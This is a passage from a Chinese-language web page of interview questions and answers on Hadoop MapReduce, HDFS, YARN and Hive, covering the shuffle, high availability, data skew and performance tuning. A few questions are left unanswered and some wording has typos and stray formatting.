src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcrHgicsHQMUeJlKBy4RGfcVWPIFdVwp2hranmn0Ka9bLMZwEgIulaMAw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>shuffle: 洗牌、发牌——（核心机制：缓存，数据分区，排序，Merge进行局部value的合并）；</p><p>具体来说：就是将maptask输出的处理结果数据，分发给reducetask，并在分发的过程中，对数据按key进行了分区和排序；</p><p>1）Map 方法之后 Reduce 方法之前这段处理过程叫 Shuffle</p><p>2）Map 方法之后，数据首先进入到分区方法，把数据标记好分区，然后把数据发送到 环形缓冲区；环形缓冲区默认大小 100m，环形缓冲区达到 80%时，进行溢写；溢写前对数 据进行排序，排序按照对 key 的索引进行字典顺序排序，排序的手段快排；溢写产生大量溢 写文件，需要对溢写文件进行归并排序；对溢写的文件也可以进行 Combiner 操作，前提是汇总操作，求平均值不行。最后将文件按照分区存储到磁盘，等待 Reduce 端拉取。</p><p>3）每个 Reduce 拉取 Map 端对应分区的数据。拉取数据后先存储到内存中，内存不够 了，再存储到磁盘。拉取完所有数据后，采用归并排序将内存和磁盘中的数据都进行排序。</p><p>在进入 Reduce 方法前，可以对数据进行分组操作。</p><h2 id="12-Mapreduce-的-map-数量-和-reduce-数量是由什么决定的-怎么配置"><a href="#12-Mapreduce-的-map-数量-和-reduce-数量是由什么决定的-怎么配置" class="headerlink" title="12.Mapreduce 的 map 数量 和 reduce 数量是由什么决定的 ,怎么配置"></a>12.Mapreduce 的 map 数量 和 reduce 数量是由什么决定的 ,怎么配置</h2><p>map的数量由输入切片的数量决定，128M切分一个切片，只要是文件也分为一个切片，有多少个切片就有多少个map Task。</p><p>reduce数量自己配置。</p><h2 id="13-MapReduce优化经验"><a href="#13-MapReduce优化经验" class="headerlink" title="13.MapReduce优化经验"></a>13.MapReduce优化经验</h2><ol><li>设置合理的map和reduce的个数。合理设置blocksize</li><li>避免出现数据倾斜</li><li>combine函数</li><li>对数据进行压缩</li><li>小文件处理优化：事先合并成大文件，combineTextInputformat，在hdfs上用mapreduce将小文件合并成SequenceFile大文件（key:文件名，value：文件内容）</li><li>参数优化</li></ol><h2 id="14-分别举例什么情况要使用-combiner，什么情况不使用？"><a href="#14-分别举例什么情况要使用-combiner，什么情况不使用？" class="headerlink" title="14.分别举例什么情况要使用 combiner，什么情况不使用？"></a>14.分别举例什么情况要使用 combiner，什么情况不使用？</h2><p>求平均数的时候就不需要用combiner，因为不会减少reduce执行数量。在其他的时候，可以依据情况，使用combiner，来减少map的输出数量，减少拷贝到reduce的文件，从而减轻reduce的压力，节省网络开销，提升执行效率</p><h2 id="15-MR运行流程解析"><a href="#15-MR运行流程解析" class="headerlink" title="15.MR运行流程解析"></a>15.MR运行流程解析</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNchNxia7Q6o6VX0ZEv5icsTeGXLHe04aRjcgXAbXlEXib5oNKW7fdadsiakg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><ol><li><p>一个mr程序启动的时候，最先启动的是MRAppMaster，MRAppMaster启动后根据本次job的描述信息，计算出需要的maptask实例数量，然后向集群申请机器启动相应数量的maptask进程</p></li><li><p>maptask进程启动之后，根据给定的数据切片范围进行数据处理，主体流程为：</p></li><li><ol><li>利用客户指定的inputformat来获取RecordReader读取数据，形成输入KV对</li><li>将输入KV对传递给客户定义的map()方法，做逻辑运算，并将map()方法输出的KV对收集到缓存</li><li>将缓存中的KV对按照K分区排序后不断溢写到磁盘文件</li></ol></li><li><p>MRAppMaster监控到所有maptask进程任务完成之后，会根据客户指定的参数启动相应数量的reducetask进程，并告知reducetask进程要处理的数据范围（数据分区）</p></li><li><p>Reducetask进程启动之后，根据MRAppMaster告知的待处理数据所在位置，从若干台maptask运行所在机器上获取到若干个maptask输出结果文件，并在本地进行重新归并排序，然后按照相同key的KV为一个组，调用客户定义的reduce()方法进行逻辑运算，并收集运算输出的结果KV，然后调用客户指定的outputformat将结果数据输出到外部存储</p></li></ol><h2 id="16-简单描述一下HDFS的系统架构，怎么保证数据安全"><a href="#16-简单描述一下HDFS的系统架构，怎么保证数据安全" class="headerlink" title="16.简单描述一下HDFS的系统架构，怎么保证数据安全?"></a>16.简单描述一下HDFS的系统架构，怎么保证数据安全?</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcOP87FAYFZBwibkLJecjKTXSnFrjltvaZpDaDbz08y3olcH2Qy2n80sw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>HDFS数据安全性如何保证？</p><ol><li>存储在HDFS系统上的文件，会分割成128M大小的block存储在不同的节点上，block的副本数默认3份，也可配置成更多份；</li><li>第一个副本一般放置在与client（客户端）所在的同一节点上（若客户端无datanode，则随机放），第二个副本放置到与第一个副本同一机架的不同节点，第三个副本放到不同机架的datanode节点，当取用时遵循就近原则；</li><li>datanode已block为单位，每3s报告心跳状态，做10min内不报告心跳状态则namenode认为block已死掉，namonode会把其上面的数据备份到其他一个datanode节点上，保证数据的副本数量；</li><li>datanode会默认每小时把自己节点上的所有块状态信息报告给namenode；</li><li>采用safemode模式：datanode会周期性的报告block信息。Namenode会计算block的损坏率，当阀值&lt;0.999f时系统会进入安全模式，HDFS只读不写。HDFS元数据采用secondaryname备份或者HA备份</li></ol><h2 id="17-在通过客户端向hdfs中写数据的时候，如果某一台机器宕机了，会怎么处理"><a href="#17-在通过客户端向hdfs中写数据的时候，如果某一台机器宕机了，会怎么处理" class="headerlink" title="17.在通过客户端向hdfs中写数据的时候，如果某一台机器宕机了，会怎么处理"></a>17.在通过客户端向hdfs中写数据的时候，如果某一台机器宕机了，会怎么处理</h2><p>​    在写入的时候不会重新重新分配datanode。如果写入时，一个datanode挂掉，会将已经写入的数据放置到queue的顶部，并将挂掉的datanode移出pipline，将数据写入到剩余的datanode，在写入结束后， namenode会收集datanode的信息，发现此文件的replication没有达到配置的要求（default=3）,然后寻找一个datanode保存副本。</p><h2 id="18-Hadoop优化有哪些方面"><a href="#18-Hadoop优化有哪些方面" class="headerlink" title="18.Hadoop优化有哪些方面"></a>18.Hadoop优化有哪些方面</h2><p>0）HDFS 小文件影响</p><p>（1）影响 NameNode 的寿命，因为文件元数据存储在 NameNode 的内存中</p><p>（2）影响计算引擎的任务数量，比如每个小的文件都会生成一个 Map 任务</p><p>1）数据输入小文件处理：</p><p>（1）合并小文件：对小文件进行归档（Har）、自定义 Inputformat 将小文件存储成SequenceFile 文件。</p><p>（2）采用 ConbinFileInputFormat 来作为输入，解决输入端大量小文件场景。</p><p>（3）对于大量小文件 Job，可以开启 JVM 重用。</p><p>2）Map 阶段</p><p>（1）增大环形缓冲区大小。由 100m 扩大到 200m</p><p>（2）增大环形缓冲区溢写的比例。由 80%扩大到 90%</p><p>（3）减少对溢写文件的 merge 次数。（10 个文件，一次 20 个 merge）</p><p>（4）不影响实际业务的前提下，采用 Combiner 提前合并，减少 I/O。</p><p>3）Reduce 阶段</p><p>（1）合理设置 Map 和 Reduce 数：两个都不能设置太少，也不能设置太多。太少，会导致 Task 等待，延长处理时间；太多，会导致 Map、Reduce 任务间竞争资源，造成处理超时等错误。</p><p>（2）设置 Map、Reduce 共存：调整 slowstart.completedmaps 参数，使 Map 运行到一定程度后，Reduce 也开始运行，减少 Reduce 的等待时间。</p><p>（3）规避使用 Reduce，因为 Reduce 在用于连接数据集的时候将会产生大量的网络消耗。</p><p>（4）增加每个 Reduce 去 Map 中拿数据的并行数</p><p>（5）集群性能可以的前提下，增大 Reduce 端存储数据内存的大小。</p><p>4）IO 传输</p><p>（1）采用数据压缩的方式，减少网络 IO 的的时间。安装 Snappy 和 LZOP 压缩编码器。</p><p>（2）使用 SequenceFile 二进制文件</p><p>5）整体</p><p>（1）MapTask 默认内存大小为 1G，可以增加 MapTask 内存大小为 4-5g</p><p>（2）ReduceTask 默认内存大小为 1G，可以增加 ReduceTask 内存大小为 4-5g</p><p>（3）可以增加 MapTask 的 cpu 核数，增加 ReduceTask 的 CPU 核数</p><p>（4）增加每个 Container 的 CPU 核数和内存大小</p><p>（5）调整每个 Map Task 和 Reduce Task 最大重试次数</p><h2 id="19-大量数据求topN-写出mapreduce的实现思路）"><a href="#19-大量数据求topN-写出mapreduce的实现思路）" class="headerlink" title="19.大量数据求topN(写出mapreduce的实现思路）"></a>19.大量数据求topN(写出mapreduce的实现思路）</h2><h2 id="20-列出正常工作的hadoop集群中hadoop都分别启动哪些进程以及他们的作用"><a href="#20-列出正常工作的hadoop集群中hadoop都分别启动哪些进程以及他们的作用" class="headerlink" title="20.列出正常工作的hadoop集群中hadoop都分别启动哪些进程以及他们的作用"></a>20.列出正常工作的hadoop集群中hadoop都分别启动哪些进程以及他们的作用</h2><p>1.NameNode它是hadoop中的主服务器，管理文件系统名称空间和对集群中存储的文件的访问，保存有metadate。</p><p>2.SecondaryNameNode它不是namenode的冗余守护进程，而是提供周期检查点和清理任务。帮助NN合并editslog，减少NN启动时间。</p><p>3.DataNode它负责管理连接到节点的存储（一个集群中可以有多个节点）。每个存储数据的节点运行一个datanode守护进程。</p><p>4.ResourceManager（JobTracker）JobTracker负责调度DataNode上的工作。每个DataNode有一个TaskTracker，它们执行实际工作。</p><p>5.NodeManager（TaskTracker）执行任务</p><p>6.DFSZKFailoverController高可用时它负责监控NN的状态，并及时的把状态信息写入ZK。它通过一个独立线程周期性的调用NN上的一个特定接口来获取NN的健康状态。FC也有选择谁作为Active NN的权利，因为最多只有两个节点，目前选择策略还比较简单（先到先得，轮换）。</p><p>7.JournalNode 高可用情况下存放namenode的editlog文件.</p><h2 id="21-Hadoop总job和Tasks之间的区别是什么？"><a href="#21-Hadoop总job和Tasks之间的区别是什么？" class="headerlink" title="21.Hadoop总job和Tasks之间的区别是什么？"></a>21.Hadoop总job和Tasks之间的区别是什么？</h2><p>Job是我们对一个完整的mapreduce程序的抽象封装</p><p>Task是job运行时，每一个处理阶段的具体实例，如map task，reduce task，maptask和reduce task都会有多个并发运行的实例</p><h2 id="22-Hadoop高可用HA模式"><a href="#22-Hadoop高可用HA模式" class="headerlink" title="22.Hadoop高可用HA模式"></a>22.Hadoop高可用HA模式</h2><p>HDFS高可用原理：</p><p>Hadoop HA（High Available）通过同时配置两个处于Active/Passive模式的Namenode来解决上述问题，状态分别是Active和Standby. Standby Namenode作为热备份，从而允许在机器发生故障时能够快速进行故障转移，同时在日常维护的时候使用优雅的方式进行Namenode切换。Namenode只能配置一主一备，不能多于两个Namenode。</p><p>主Namenode处理所有的操作请求（读写），而Standby只是作为slave，维护尽可能同步的状态，使得故障时能够快速切换到Standby。为了使Standby Namenode与Active Namenode数据保持同步，两个Namenode都与一组Journal Node进行通信。当主Namenode进行任务的namespace操作时，都会确保持久会修改日志到Journal Node节点中。Standby Namenode持续监控这些edit，当监测到变化时，将这些修改同步到自己的namespace。</p><p>当进行故障转移时，Standby在成为Active Namenode之前，会确保自己已经读取了Journal Node中的所有edit日志，从而保持数据状态与故障发生前一致。</p><p>为了确保故障转移能够快速完成，Standby Namenode需要维护最新的Block位置信息，即每个Block副本存放在集群中的哪些节点上。为了达到这一点，Datanode同时配置主备两个Namenode，并同时发送Block报告和心跳到两台Namenode。</p><p>确保任何时刻只有一个Namenode处于Active状态非常重要，否则可能出现数据丢失或者数据损坏。当两台Namenode都认为自己的Active Namenode时，会同时尝试写入数据（不会再去检测和同步数据）。为了防止这种脑裂现象，Journal Nodes只允许一个Namenode写入数据，内部通过维护epoch数来控制，从而安全地进行故障转移。</p><h2 id="23-简要描述安装配置一个hadoop集群的步骤"><a href="#23-简要描述安装配置一个hadoop集群的步骤" class="headerlink" title="23.简要描述安装配置一个hadoop集群的步骤"></a>23.简要描述安装配置一个hadoop集群的步骤</h2><ol><li>使用root账户登录。</li><li>修改IP。</li><li>修改Host主机名。</li><li>配置SSH免密码登录。</li><li>关闭防火墙。</li><li>安装JDK。</li><li>上传解压Hadoop安装包。</li><li>配置Hadoop的核心配置文件hadoop-evn.sh，core-site.xml，mapred-site.xml，hdfs-site.xml，yarn-site.xml</li><li>配置hadoop环境变量</li><li>格式化hdfs # bin/hadoop  namenode  -format</li><li>启动节点start-all.sh</li></ol><h2 id="24-fsimage和edit的区别"><a href="#24-fsimage和edit的区别" class="headerlink" title="24.fsimage和edit的区别"></a>24.fsimage和edit的区别</h2><p>fsimage：filesystem image 的简写，文件镜像。</p><p>客户端修改文件时候，先更新内存中的metadata信息,只有当对文件操作成功的时候，才会写到editlog。</p><p>fsimage是文件meta信息的持久化的检查点。secondary namenode会定期的将fsimage和editlog合并dump成新的fsimage</p><h2 id="25-yarn的三大调度策略"><a href="#25-yarn的三大调度策略" class="headerlink" title="25.yarn的三大调度策略"></a>25.yarn的三大调度策略</h2><p>FIFO Scheduler把应用按提交的顺序排成一个队列，这是一个先进先出队列，在进行资源分配的时候，先给队列中最头上的应用进行分配资源，待最头上的应用需求满足后再给下一个分配，以此类推。</p><p>Capacity（容量）调度器，有一个专门的队列用来运行小任务，但是为小任务专门设置一个队列会预先占用一定的集群资源，这就导致大任务的执行时间会落后于使用FIFO调度器时的时间。</p><p>在Fair（公平）调度器中，我们不需要预先占用一定的系统资源，Fair调度器会为所有运行的job动态的调整系统资源。当第一个大job提交时，只有这一个job在运行，此时它获得了所有集群资源；当第二个小任务提交后，Fair调度器会分配一半资源给这个小任务，让这两个任务公平的共享集群资源。</p><p>  需要注意的是，在下图Fair调度器中，从第二个任务提交到获得资源会有一定的延迟，因为它需要等待第一个任务释放占用的Container。小任务执行完成之后也会释放自己占用的资源，大任务又获得了全部的系统资源。最终的效果就是Fair调度器即得到了高的资源利用率又能保证小任务及时完成。</p><h2 id="26-hadoop的shell命令用的多吗-说出一些常用的"><a href="#26-hadoop的shell命令用的多吗-说出一些常用的" class="headerlink" title="26.hadoop的shell命令用的多吗?,说出一些常用的"></a>26.hadoop的shell命令用的多吗?,说出一些常用的</h2><h1 id="二-Hive"><a href="#二-Hive" class="headerlink" title="二.Hive"></a>二.Hive</h1><h2 id="1-大表join小表产生的问题，怎么解决？"><a href="#1-大表join小表产生的问题，怎么解决？" class="headerlink" title="1.大表join小表产生的问题，怎么解决？"></a>1.大表join小表产生的问题，怎么解决？</h2><p>mapjoin方案</p><p>join因为空值导致长尾(key为空值是用随机值代替)</p><p>join因为热点值导致长尾，也可以将热点数据和非热点数据分开处理，最后合并</p><h2 id="2-udf-udaf-udtf区别"><a href="#2-udf-udaf-udtf区别" class="headerlink" title="2.udf udaf udtf区别"></a>2.udf udaf udtf区别</h2><p>UDF操作作用于单个数据行，并且产生一个数据行作为输出。大多数函数都属于这一类（比如数学函数和字符串函数）。</p><p>UDAF 接受多个输入数据行，并产生一个输出数据行。像COUNT和MAX这样的函数就是聚集函数。</p><p>UDTF 操作作用于单个数据行，并且产生多个数据行——-一个表作为输出。lateral view explore()</p><p>简单来说：</p><p>UDF:返回对应值，一对一</p><p>UDAF：返回聚类值，多对一</p><p>UDTF：返回拆分值，一对多</p><h2 id="3-hive有哪些保存元数据的方式，个有什么特点。"><a href="#3-hive有哪些保存元数据的方式，个有什么特点。" class="headerlink" title="3.hive有哪些保存元数据的方式，个有什么特点。"></a>3.hive有哪些保存元数据的方式，个有什么特点。</h2><ul><li>内存数据库derby，安装小，但是数据存在内存，不稳定</li><li>mysql数据库，数据存储模式可以自己设置，持久化好，查看方便。</li></ul><h2 id="4-hive内部表和外部表的区别"><a href="#4-hive内部表和外部表的区别" class="headerlink" title="4.hive内部表和外部表的区别"></a>4.hive内部表和外部表的区别</h2><p>内部表：加载数据到hive所在的hdfs目录，删除时，元数据和数据文件都删除</p><p>外部表：不加载数据到hive所在的hdfs目录，删除时，只删除表结构。</p><p>这样外部表相对来说更加安全些，数据组织也更加灵活，方便共享源数据。 </p><h2 id="5-生产环境中为什么建议使用外部表？"><a href="#5-生产环境中为什么建议使用外部表？" class="headerlink" title="5.生产环境中为什么建议使用外部表？"></a>5.生产环境中为什么建议使用外部表？</h2><ol><li>因为外部表不会加载数据到hive，减少数据传输、数据还能共享。</li><li>hive不会修改数据，所以无需担心数据的损坏</li><li>删除表时，只删除表结构、不删除数据。</li></ol><h2 id="6-insert-into-和-override-write区别？"><a href="#6-insert-into-和-override-write区别？" class="headerlink" title="6.insert into 和 override write区别？"></a>6.insert into 和 override write区别？</h2><p>insert into：将数据写到表中</p><p>override write：覆盖之前的内容。</p><h2 id="7-hive的判断函数有哪些"><a href="#7-hive的判断函数有哪些" class="headerlink" title="7.hive的判断函数有哪些"></a>7.hive的判断函数有哪些</h2><p>hive 的条件判断（if、coalesce、case）</p><h2 id="8-简单描述一下HIVE的功能？用hive创建表有几种方式？hive表有几种？"><a href="#8-简单描述一下HIVE的功能？用hive创建表有几种方式？hive表有几种？" class="headerlink" title="8.简单描述一下HIVE的功能？用hive创建表有几种方式？hive表有几种？"></a>8.简单描述一下HIVE的功能？用hive创建表有几种方式？hive表有几种？</h2><p>hive主要是做离线分析的</p><p>hive建表有三种方式</p><ul><li>直接建表法</li><li>查询建表法<strong>(</strong>通过AS 查询语句完成建表：将子查询的结果存在新表里，有数据<strong>，</strong>一般用于中间表<strong>)</strong></li><li>like建表法(会创建结构完全相同的表，但是没有数据)</li></ul><p>hive表有2种：内部表和外部表</p><h2 id="9-线上业务每天产生的业务日志（压缩后-gt-3G），每天需要加载到hive的log表中，将每天产生的业务日志在压缩之后load到hive的log表时，最好使用的压缩算法是哪个-并说明其原因"><a href="#9-线上业务每天产生的业务日志（压缩后-gt-3G），每天需要加载到hive的log表中，将每天产生的业务日志在压缩之后load到hive的log表时，最好使用的压缩算法是哪个-并说明其原因" class="headerlink" title="9.线上业务每天产生的业务日志（压缩后&gt;=3G），每天需要加载到hive的log表中，将每天产生的业务日志在压缩之后load到hive的log表时，最好使用的压缩算法是哪个,并说明其原因"></a>9.线上业务每天产生的业务日志（压缩后&gt;=3G），每天需要加载到hive的log表中，将每天产生的业务日志在压缩之后load到hive的log表时，最好使用的压缩算法是哪个,并说明其原因</h2><p><strong>*\</strong>*<br>**<em>**</em></p><h2 id="10-若在hive中建立分区仍不能优化查询效率，建表时如何优化"><a href="#10-若在hive中建立分区仍不能优化查询效率，建表时如何优化" class="headerlink" title="10.若在hive中建立分区仍不能优化查询效率，建表时如何优化"></a>10.若在hive中建立分区仍不能优化查询效率，建表时如何优化</h2><h2 id="11-union-all和union的区别"><a href="#11-union-all和union的区别" class="headerlink" title="11.union all和union的区别"></a>11.union all和union的区别</h2><p>union 去重</p><p>union oll 不去重</p><h2 id="12-如何解决hive数据倾斜的问题"><a href="#12-如何解决hive数据倾斜的问题" class="headerlink" title="12.如何解决hive数据倾斜的问题"></a>12.如何解决hive数据倾斜的问题</h2><p><strong>1**</strong>）<strong>**group by</strong></p><p>注：group by 优于 distinct group</p><p>情形：group by 维度过小，某值的数量过多</p><p>后果：处理某值的 reduce 非常耗时</p><p>解决方式：采用 sum() group by 的方式来替换 count(distinct)完成计算。</p><p><strong>2**</strong>）<strong>**count(distinct)</strong></p><p>count(distinct xx)</p><p>情形：某特殊值过多</p><p>后果：处理此特殊值的 reduce 耗时；只有一个 reduce 任务</p><p>解决方式：count distinct 时，将值为空的情况单独处理，比如可以直接过滤空值的行，</p><p>在最后结果中加 1。如果还有其他计算，需要进行 group by，可以先将值为空的记录单独处</p><p>理，再和其他计算结果进行 union。</p><p><strong>3**</strong>）<strong>**mapjoin</strong></p><p><strong>4**</strong>）不同数据类型关联产生数据倾斜**</p><p>情形：比如用户表中 user_id 字段为 int，log 表中 user_id 字段既有 string 类型也有 int 类型。当按照 user_id 进行两个表的 Join 操作时。</p><p>后果：处理此特殊值的 reduce 耗时；只有一个 reduce 任务</p><p>默认的 Hash 操作会按 int 型的 id 来进行分配，这样会导致所有 string 类型 id 的记录都分配</p><p>到一个 Reducer 中。</p><p>解决方式：把数字类型转换成字符串类型</p><p>select * from users a</p><p>left outer join logs b</p><p>on a.usr_id = cast(b.user_id as string)</p><p><strong>5**</strong>）开启数据倾斜时负载均衡**</p><p>set hive.groupby.skewindata=true;</p><p>思想：就是先随机分发并处理，再按照 key group by 来分发处理。</p><p>操作：当选项设定为 true，生成的查询计划会有两个 MRJob。</p><p>第一个 MRJob 中，Map 的输出结果集合会随机分布到 Reduce 中，每个 Reduce 做部分</p><p>聚合操作，并输出结果，这样处理的结果是相同的 GroupBy Key 有可能被分发到不同的</p><p>Reduce 中，从而达到负载均衡的目的；</p><p>第二个 MRJob 再根据预处理的数据结果按照 GroupBy Key 分布到 Reduce 中（这个过</p><p>程可以保证相同的原始 GroupBy Key 被分布到同一个 Reduce 中），最后完成最终的聚合操</p><p>作。</p><p>点评：它使计算变成了两个 mapreduce，先在第一个中在 shuffle 过程 partition 时随机</p><p>给 key 打标记，使每个 key 随机均匀分布到各个 reduce 上计算，但是这样只能完成部分</p><p>计算，因为相同 key 没有分配到相同 reduce 上。</p><p>所以需要第二次的 mapreduce,这次就回归正常 shuffle,但是数据分布不均匀的问题在第</p><p>一次 mapreduce 已经有了很大的改善，因此基本解决数据倾斜。因为大量计算已经在第一次</p><p>mr 中随机分布到各个节点完成。</p><p><strong>6**</strong>）控制空值分布**</p><p>将为空的 key 转变为字符串加随机数或纯随机数，将因空值而造成倾斜的数据分不到多</p><p>个 Reducer。</p><p>注：对于异常值如果不需要的话，最好是提前在 where 条件里过滤掉，这样可以使计算</p><p>量大大减少</p><h2 id="13-hive性能优化常用的方法"><a href="#13-hive性能优化常用的方法" class="headerlink" title="13.hive性能优化常用的方法"></a>13.hive性能优化常用的方法</h2><p><strong>1**</strong>）<strong>**MapJoin</strong></p><p>如果不指定 MapJoin 或者不符合 MapJoin 的条件，那么 Hive 解析器会将 Join 操作转换</p><p>成 Common Join，即：在 Reduce 阶段完成 join。容易发生数据倾斜。可以用 MapJoin 把小</p><p>表全部加载到内存在 map 端进行 join，避免 reducer 处理。</p><p><strong>2**</strong>）行列过滤**</p><p>列处理：在 SELECT 中，只拿需要的列，如果有，尽量使用分区过滤，少用 SELECT *。</p><p>行处理：在分区剪裁中，当使用外关联时，如果将副表的过滤条件写在 Where 后面，那</p><p>么就会先全表关联，之后再过滤。</p><p><strong>3**</strong>）列式存储**</p><p><strong>4**</strong>）采用分区技术**</p><p><strong>5**</strong>）合理设置** <strong>Map</strong> <strong>数</strong></p><p><strong>（**</strong>1<strong>**）通常情况下，作业会通过</strong> <strong>input</strong> <strong>的目录产生一个或者多个</strong> <strong>map</strong> <strong>任务。</strong></p><p>主要的决定因素有：input 的文件总个数，input 的文件大小，集群设置的文件块大小。</p><p><strong>（**</strong>2<strong>**）是不是</strong> <strong>map</strong> <strong>数越多越好？</strong></p><p>答案是否定的。如果一个任务有很多小文件（远远小于块大小 128m），则每个小文件</p><p>也会被当做一个块，用一个 map 任务来完成，而一个 map 任务启动和初始化的时间远远大</p><p>于逻辑处理的时间，就会造成很大的资源浪费。而且，同时可执行的 map 数是受限的。</p><p><strong>（**</strong>3<strong>**）是不是保证每个</strong> <strong>map</strong> <strong>处理接近</strong> <strong>128m</strong> <strong>的文件块，就高枕无忧了？</strong></p><p>答案也是不一定。比如有一个 127m 的文件，正常会用一个 map 去完成，但这个文件只</p><p>有一个或者两个小字段，却有几千万的记录，如果 map 处理的逻辑比较复杂，用一个 map</p><p>任务去做，肯定也比较耗时。</p><p>针对上面的问题 2 和 3，我们需要采取两种方式来解决：即减少 map 数和增加 map 数；</p><p><strong>6**</strong>）小文件进行合并**</p><p>在 Map 执行前合并小文件，减少 Map 数：CombineHiveInputFormat 具有对小文件进行</p><p>合并的功能（系统默认的格式）。HiveInputFormat 没有对小文件合并功能。</p><p><strong>7**</strong>）合理设置** <strong>Reduce</strong> <strong>数</strong></p><p>Reduce 个数并不是越多越好</p><p>（1）过多的启动和初始化 Reduce 也会消耗时间和资源；</p><p>（2）另外，有多少个 Reduce，就会有多少个输出文件，如果生成了很多个小文件，那</p><p>么如果这些小文件作为下一个任务的输入，则也会出现小文件过多的问题；</p><p>在设置 Reduce 个数的时候也需要考虑这两个原则：处理大数据量利用合适的 Reduce</p><p>数；使单个 Reduce 任务处理数据量大小要合适；</p><p><strong>8**</strong>）常用参数**</p><p>// 输出合并小文件</p><p>SET hive.merge.mapfiles = true; – 默认 true，在 map-only 任务结束时合并</p><p>小文件</p><p>SET hive.merge.mapredfiles = true; – 默认 false，在 map-reduce 任务结</p><p>束时合并小文件</p><p>SET hive.merge.size.per.task = 268435456; – 默认 256M</p><p>SET hive.merge.smallfiles.avgsize = 16777216; – 当输出文件的平均大小</p><p>小于 16m 该值时，启动一个独立的 map-reduce 任务进行文件 merge</p><p><strong>9**</strong>）开启** <strong>map</strong> <strong>端</strong> <strong>combiner**</strong>（不影响最终业务逻辑）**</p><p>set hive.map.aggr=true；</p><p><strong>10**</strong>）压缩（选择快的）**</p><p>设置 map 端输出、中间结果压缩。（不完全是解决数据倾斜的问题，但是减少了 IO 读</p><p>写和网络传输，能提高很多效率）</p><p><strong>11**</strong>）开启** <strong>JVM</strong> <strong>重用</strong></p><p>**<br>**</p><h2 id="14-简述delete，drop，truncate的区别"><a href="#14-简述delete，drop，truncate的区别" class="headerlink" title="14.简述delete，drop，truncate的区别"></a>14.简述delete，drop，truncate的区别</h2><p>delet 删除数据</p><p>drop 删除表</p><p>truncate 摧毁表结构并重建</p><h2 id="15-四个by的区别"><a href="#15-四个by的区别" class="headerlink" title="15.四个by的区别"></a>15.四个by的区别</h2><ol><li>Sort By：分区内有序；</li><li>Order By：全局排序，只有一个 Reducer；</li><li>Distrbute By：类似 MR 中 Partition，进行分区，结合 sort by 使用。</li><li>Cluster By：当 Distribute by 和 Sorts by 字段相同时，可以使用 Cluster by 方式。Cluster by 除了具有 Distribute by 的功能外还兼具 Sort by 的功能。但是排序只能是升序排序，不能 指定排序规则为 ASC 或者 DESC。</li></ol><h2 id="16-Hive-里边字段的分隔符用的什么？为什么用-t？有遇到过字段里-边有-t-的情况吗，怎么处理的？为什么不用-Hive-默认的分隔符，默认的分隔符是什么？"><a href="#16-Hive-里边字段的分隔符用的什么？为什么用-t？有遇到过字段里-边有-t-的情况吗，怎么处理的？为什么不用-Hive-默认的分隔符，默认的分隔符是什么？" class="headerlink" title="16.Hive 里边字段的分隔符用的什么？为什么用\t？有遇到过字段里 边有\t 的情况吗，怎么处理的？为什么不用 Hive 默认的分隔符，默认的分隔符是什么？"></a>16.Hive 里边字段的分隔符用的什么？为什么用\t？有遇到过字段里 边有\t 的情况吗，怎么处理的？为什么不用 Hive 默认的分隔符，默认的分隔符是什么？</h2><p>hive 默认的字段分隔符为 ascii 码的控制符\001（^A）,建表的时候用 fields terminated by ‘\001’</p><p>遇到过字段里边有\t 的情况，自定义 InputFormat，替换为其他分隔符再做后续处理</p><h2 id="17-分区分桶的区别，为什么要分区"><a href="#17-分区分桶的区别，为什么要分区" class="headerlink" title="17.分区分桶的区别，为什么要分区"></a>17.分区分桶的区别，为什么要分区</h2><p><strong>分区表</strong>：原来的一个大表存储的时候分成不同的数据目录进行存储。如果说是单分区表，那么在表的目录下就只有一级子目录，如果说是多分区表，那么在表的目录下有多少分区就有多少级子目录。不管是单分区表，还是多分区表，在表的目录下，和非最终分区目录下是不能直接存储数据文件的 </p><p><strong>分桶表</strong>：原理和hashpartitioner 一样，将hive中的一张表的数据进行归纳分类的时候，归纳分类规则就是hashpartitioner。（需要指定分桶字段，指定分成多少桶）</p><p><strong>分区表和分桶的区别除了存储的格式不同外，最主要的是作用：</strong></p><ul><li>分区表：细化数据管理，缩小mapreduce程序 需要<strong>扫描的数据量</strong>。</li><li>分桶表：<strong>提高join查询的效率</strong>，在一份数据会被经常用来做连接查询的时候建立分桶，分桶字段就是连接字段；<strong>提高采样的效率</strong>。</li></ul><p><strong>分区表和分桶的区别除了存储的格式不同外，最主要的是作用：</strong></p><ul><li>分区表：细化数据管理，缩小mapreduce程序 需要<strong>扫描的数据量</strong>。</li><li>分桶表：<strong>提高join查询的效率</strong>，在一份数据会被经常用来做连接查询的时候建立分桶，分桶字段就是连接字段；<strong>提高采样的效率</strong>。</li></ul><h2 id="18-mapjoin的原理"><a href="#18-mapjoin的原理" class="headerlink" title="18.mapjoin的原理"></a>18.mapjoin的原理</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcqsgnnqcK8vianaMr55VDAuTtLRx4lS1NdVd40DYNJR4dEzAX7fbCsOA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>​      MapJoin通常用于一个很小的表和一个大表进行join的场景，具体小表有多小，由参数hive.mapjoin.smalltable.filesize来决定，该参数表示小表的总大小，默认值为25000000字节，即25M。<br>Hive0.7之前，需要使用hint提示 /*+ mapjoin(table) */才会执行MapJoin,否则执行Common Join，但在0.7版本之后，默认自动会转换Map Join，由参数hive.auto.convert.join来控制，默认为true.<br>假设a表为一张大表，b为小表，并且hive.auto.convert.join=true,那么Hive在执行时候会自动转化为MapJoin。</p><blockquote><p>MapJoin简单说就是在Map阶段将小表读入内存，顺序扫描大表完成Join。减少昂贵的shuffle操作及reduce操作<br>MapJoin分为两个阶段：</p><ul><li>通过MapReduce Local Task，将小表读入内存，生成HashTableFiles上传至Distributed Cache中，这里会HashTableFiles进行压缩。</li><li>MapReduce Job在Map阶段，每个Mapper从Distributed 